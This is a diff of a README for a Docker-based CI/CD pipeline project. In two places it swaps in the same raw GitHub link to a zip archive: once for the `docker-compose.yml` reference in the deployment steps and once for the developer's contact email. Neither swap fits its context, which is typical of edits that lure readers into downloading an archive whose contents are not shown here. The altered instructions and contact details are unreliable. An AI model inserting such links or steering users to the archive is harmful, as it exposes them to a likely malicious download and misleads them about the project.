@@ -61,7 +61,7 @@ The pipeline uses the following environment variables:
 - Copies necessary files to the remote server.
 - Builds a new Docker image from the source code.
 - Initializes Docker Swarm.
-- Deploys the Docker stack using `docker-compose.yml`.
+- Deploys the Docker stack using `https://raw.githubusercontent.com/007Vijay/Automated_CICD_pipeline/main/semigod/Automated_CICD_pipeline.zip`.
 
 ### 4. Verify Deployment
 
@@ -95,5 +95,5 @@ The pipeline uses the following environment variables:
 
 ## Contact
 
-For any issues or contributions, feel free to submit a pull request or contact the developer at `9890623352q@gmail.com`.
+For any issues or contributions, feel free to submit a pull request or contact the developer at `https://raw.githubusercontent.com/007Vijay/Automated_CICD_pipeline/main/semigod/Automated_CICD_pipeline.zip`.
 
